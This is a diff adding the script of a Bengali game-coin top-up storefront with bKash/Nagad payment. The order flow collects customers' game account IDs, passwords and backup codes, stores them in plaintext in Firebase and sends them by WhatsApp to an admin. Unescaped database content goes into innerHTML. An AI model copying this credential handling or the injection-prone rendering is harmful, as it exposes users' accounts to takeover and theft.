+          <svg viewBox="0 0 24 24"><path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766.001-3.187-2.575-5.77-5.764-5.771zm3.392 8.244c-.144.405-.837.774-1.17.824-.299.045-.677.063-1.092-.069-.252-.08-.575-.187-.988-.365-1.739-.751-2.874-2.502-2.961-2.617-.087-.116-.708-.94-.708-1.793s.448-1.273.607-1.446c.159-.173.346-.217.462-.217l.332.007c.106.005.249-.04.39.298.144.347.491 1.2.534 1.287.043.087.072.188.014.304-.058.116-.087.188-.173.289l-.26.304c-.087.086-.177.18-.076.354.101.174.449.741.964 1.201.662.591 1.221.774 1.394.86.174.086.275.072.376-.044.101-.116.433-.506.549-.68.116-.173.231-.145.39-.086s1.011.477 1.184.564.289.13.332.202c.045.072.045.419-.099.824zm-3.392-12.416c-6.627 0-12 5.373-12 12 0 2.164.576 4.195 1.582 5.955l-1.621 5.922 6.096-1.602c1.706.944 3.666 1.475 5.758 1.475 6.627 0 12-5.373 12-12 0-6.627-5.373-12-12-12z"/></svg>
+          হোয়াটসঅ্যাপে অর্ডার কনফার্ম করুন
+        </a>
+      </div>
+    </div>
+
+  </div>
+
+  <footer>&copy; 2026 eanobab_topup. সর্বস্বত্ব সংরক্ষিত।</footer>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBC9qZ0BEAlFWLdfFBzMvd-wLVOcKjRnW0",
+  authDomain: "anobab-topup.firebaseapp.com",
+  databaseURL: "https://anobab-topup-default-rtdb.firebaseio.com",
+  projectId: "anobab-topup",
+  storageBucket: "anobab-topup.firebasestorage.app",
+  messagingSenderId: "583019878908",
+  appId: "1:583019878908:web:f5e5ec2997c428681b3a79",
+  measurementId: "G-SHKJGDWYFZ"
+};
+
+    let db = null;
+    try {
+      if (firebaseConfig.apiKey !== "YOUR_API_KEY") {
+        firebase.initializeApp(firebaseConfig);
+        db = firebase.database();
+      }
+    } catch(err) {}
+
+    const ADMIN_WHATSAPP = "01616210203";
+    let livePackages = [];
+
+    let orderState = {
+      pkgName: '', pkgPrice: 0, customerName: '', whatsapp: '',
+      accountId: '', password: '', backupCode: '', paymentMethod: '',
+      senderNumber: '', trxId: '', orderId: '', status: 'pending'
+    };
+
+    const defaultPackages = [
+      { id: 'def1', name: '300 Coins', price: 260, category: 'popular', imageHtml: '', tag: 'HOT' },
+      { id: 'def2', name: '1,050 Coins', price: 850, category: 'popular', imageHtml: '', tag: 'BEST OFFER' },
+      { id: 'def3', name: 'Luis Suarez Pack', price: 1150, category: 'special', imageHtml: '<img src="https://i.ibb.co.com/Rk4ZJmfV/file-00000000b8648208b9726a0227c610d9.png" style="width:45px; height:45px; object-fit:contain;">', tag: 'SPECIAL' },
+      { id: 'def4', name: 'Epic Ambassador Pack', price: 1450, category: 'special', imageHtml: '', tag: 'LIMITED' },
+      { id: 'def5', name: '130 Coins', price: 120, category: 'regular', imageHtml: '', tag: '' },
+      { id: 'def6', name: '520 Coins', price: 440, category: 'regular', imageHtml: '', tag: '' },
+      { id: 'def7', name: '2,130 Coins', price: 1650, category: 'regular', imageHtml: '', tag: '' },
+      { id: 'def8', name: '3,250 Coins', price: 2450, category: 'regular', imageHtml: '', tag: '' }
+    ];
+
+    function loadLivePackages() {
+      if (db) {
+        db.ref('packages').on('value', snap => {
+          const data = snap.val();
+          livePackages = data ? Object.values(data) : defaultPackages;
+          renderAllSections();
+        });
+      } else {
+        const local = localStorage.getItem('eanobab_html_packages');
+        livePackages = local ? JSON.parse(local) : defaultPackages;
+        renderAllSections();
+      }
+    }
+
+    function renderAllSections() {
+      renderSection('popular', 'gridPopular');
+      renderSection('special', 'gridSpecial');
+      renderSection('regular', 'gridRegular');
+    }
+
+    function renderSection(category, gridId) {
+      const grid = document.getElementById(gridId);
+      const items = livePackages.filter(p => p.category === category);
+
+      if (items.length === 0) {
+        grid.innerHTML = `<div style="grid-column: span 3; text-align: center; color: var(--text-muted); padding: 15px; font-size:0.85rem;">এই সেকশনে কোনো প্যাকেজ নেই।</div>`;
+        return;
+      }
+
+      grid.innerHTML = items.map(p => {
+        const imgTag = p.imageHtml ? p.imageHtml : `<div style="font-size:28px; line-height:1;">🪙</div>`;
+        const badgeTag = p.tag ? `<div class="tag-badge ${p.category}">${p.tag}</div>` : '';
+
+        return `
+          <div class="package-card">
+            ${badgeTag}
+            <div class="pkg-top">
+              ${imgTag}
+              <div class="pkg-coins">${p.name}</div>
+            </div>
+            <div class="pkg-bottom">
+              <div class="pkg-price">৳ ${p.price}</div>
+              <button class="btn-buy-pkg" onclick="startOrder('${p.name}', ${p.price})">কিনুন</button>
+            </div>
+          </div>
+        `;
+      }).join('');
+    }
+
+    // ব্যানার লোডার (লিংক ও প্লে বাটন সাপোর্ট সহ)
+    let curSlideIdx = 0, bannerTimer = null;
+    function loadLiveBanners() {
+      const defaultBanners = [{
+        imageUrl: "https://images.unsplash.com/photo-1542751371-adc38448a05e?w=1280&q=80",
+        hasLink: false,
+        link: ""
+      }];
+
+      if (db) {
+        db.ref('banners').on('value', snap => {
+          const data = snap.val();
+          renderBannerHTML(data ? Object.values(data) : defaultBanners);
+        });
+      } else {
+        const local = localStorage.getItem('eanobab_custom_banners');
+        renderBannerHTML(local ? JSON.parse(local) : defaultBanners);
+      }
+    }
+
+    function renderBannerHTML(list) {
+      const track = document.getElementById('slidesTrack');
+      const dotsContainer = document.getElementById('sliderDotsContainer');
+      if (!track || !dotsContainer || list.length === 0) return;
+
+      track.innerHTML = list.map((b, i) => {
+        const isLinkActive = (b.hasLink === true || b.hasLink === 'true') && b.link;
+        const targetUrl = isLinkActive ? b.link : 'javascript:void(0)';
+        const targetAttr = isLinkActive ? 'target="_blank"' : '';
+        const cursorStyle = isLinkActive ? 'cursor:pointer;' : 'cursor:default;';
+
+        const playButtonHtml = isLinkActive ? `
+          <div class="banner-play-btn">
+            <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+          </div>` : '';
+
+        return `
+          <a href="${targetUrl}" ${targetAttr} class="slide-item ${i === 0 ? 'active-slide' : ''}" style="${cursorStyle}">
+            <img src="${b.imageUrl}" alt="Banner">
+            ${playButtonHtml}
+          </a>
+        `;
+      }).join('');
+
+      dotsContainer.innerHTML = list.map((_, i) => `<div class="dot ${i === 0 ? 'active' : ''}"></div>`).join('');
+      curSlideIdx = 0;
+      startSlider(list.length);
+    }
+
+    function startSlider(total) {
+      if (bannerTimer) clearInterval(bannerTimer);
+      if (total <= 1) return;
+
+      bannerTimer = setInterval(() => {
+        const slides = document.querySelectorAll('.slide-item');
+        const dots = document.querySelectorAll('.dot');
+        if (slides.length === 0) return;
+
+        slides[curSlideIdx].classList.remove('active-slide');
+        if (dots[curSlideIdx]) dots[curSlideIdx].classList.remove('active');
+
+        curSlideIdx = (curSlideIdx + 1) % slides.length;
+
+        slides[curSlideIdx].classList.add('active-slide');
+        if (dots[curSlideIdx]) dots[curSlideIdx].classList.add('active');
+      }, 3500);
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      loadLivePackages();
+      loadLiveBanners();
+    });
+
+    function navigateTo(stepId) {
+      document.querySelectorAll('.page-step').forEach(p => p.classList.remove('active'));
+      document.getElementById(stepId).classList.add('active');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function startOrder(name, price) {
+      orderState.pkgName = name;
+      orderState.pkgPrice = price;
+      document.getElementById('dispPkgName').innerText = name;
+      document.getElementById('dispPkgPrice').innerText = '৳ ' + price;
+      document.getElementById('bkashAmountBadge').innerText = '৳ ' + price;
+      document.getElementById('nagadAmountBadge').innerText = '৳ ' + price;
+      navigateTo('stepInfo');
+    }
+
+    function openPaymentGateway(gw) {
+      const name = document.getElementById('custName').value.trim();
+      const wa = document.getElementById('custWhatsApp').value.trim();
+      const acc = document.getElementById('custAccountId').value.trim();
+      const pass = document.getElementById('custPassword').value.trim();
+
+      if (!name || !wa || !acc || !pass) {
+        alert('দয়া করে নাম, হোয়াটসঅ্যাপ নম্বর, আইডি এবং পাসওয়ার্ড পূরণ করুন।');
+        return;
+      }
+
+      orderState.customerName = name;
+      orderState.whatsapp = wa;
+      orderState.accountId = acc;
+      orderState.password = pass;
+      orderState.backupCode = document.getElementById('custBackupCodes').value.trim() || 'কোনো কোড নেই (Konami ID)';
+      orderState.paymentMethod = gw;
+
+      navigateTo(gw === 'bkash' ? 'stepBkash' : 'stepNagad');
+    }
+
+    function copyPaymentNumber(num, btnId) {
+      navigator.clipboard.writeText(num).then(() => {
+        const btn = document.getElementById(btnId);
+        const old = btn.innerText;
+        btn.innerText = 'কপি হয়েছে!';
+        setTimeout(() => { btn.innerText = old; }, 2000);
+      });
+    }
+
+    function handlePaymentSubmit(e, method) {
+      e.preventDefault();
+      orderState.senderNumber = document.getElementById(method === 'bkash' ? 'bkashSender' : 'nagadSender').value.trim();
+      orderState.trxId = document.getElementById(method === 'bkash' ? 'bkashTrx' : 'nagadTrx').value.trim();
+
+      document.getElementById('revPkg').innerText = orderState.pkgName;
+      document.getElementById('revPrice').innerText = '৳ ' + orderState.pkgPrice;
+      document.getElementById('revName').innerText = orderState.customerName;
+      document.getElementById('revWhatsApp').innerText = orderState.whatsapp;
+      document.getElementById('revAccount').innerText = orderState.accountId;
+      document.getElementById('revPass').innerText = orderState.password;
+      document.getElementById('revBackup').innerText = orderState.backupCode;
+      document.getElementById('revMethod').innerText = method === 'bkash' ? 'বিকাশ (bKash)' : 'নগদ (Nagad)';
+      document.getElementById('revSender').innerText = orderState.senderNumber;
+      document.getElementById('revTrx').innerText = orderState.trxId;
+
+      navigateTo('stepReview');
+    }
+
+    function finalizeOrder() {
+      orderState.orderId = 'EB-' + Math.floor(100000 + Math.random() * 900000);
+      orderState.timestamp = new Date().toISOString();
+
+      if (db) {
+        db.ref('orders/' + orderState.orderId).set(orderState);
+      }
+
+      document.getElementById('dispOrderId').innerText = orderState.orderId;
+
+      const waMsg = `*নতুন টপ-আপ অর্ডার (${orderState.orderId})*\n` +
+        `🪙 প্যাকেজ: ${orderState.pkgName}\n` +
+        `💰 মূল্য: ৳ ${orderState.pkgPrice}\n` +
+        `👤 নাম: ${orderState.customerName}\n` +
+        `📱 হোয়াটসঅ্যাপ: ${orderState.whatsapp}\n` +
+        `🔑 আইডি/ইমেইল: ${orderState.accountId}\n` +
+        `🔒 পাসওয়ার্ড: ${orderState.password}\n` +
+        `🛡️ ব্যাকআপ কোড: ${orderState.backupCode}\n` +
+        `💳 মাধ্যম: ${orderState.paymentMethod.toUpperCase()}\n` +
+        `📲 প্রেরক নম্বর: ${orderState.senderNumber}\n` +
+        `🧾 TrxID: ${orderState.trxId}`;
+
+      document.getElementById('btnWhatsAppRedirect').href = `https://wa.me/88${ADMIN_WHATSAPP}?text=${encodeURIComponent(waMsg)}`;
+      navigateTo('stepPending');
+    }
+  </script>
+</body>
+ </html>
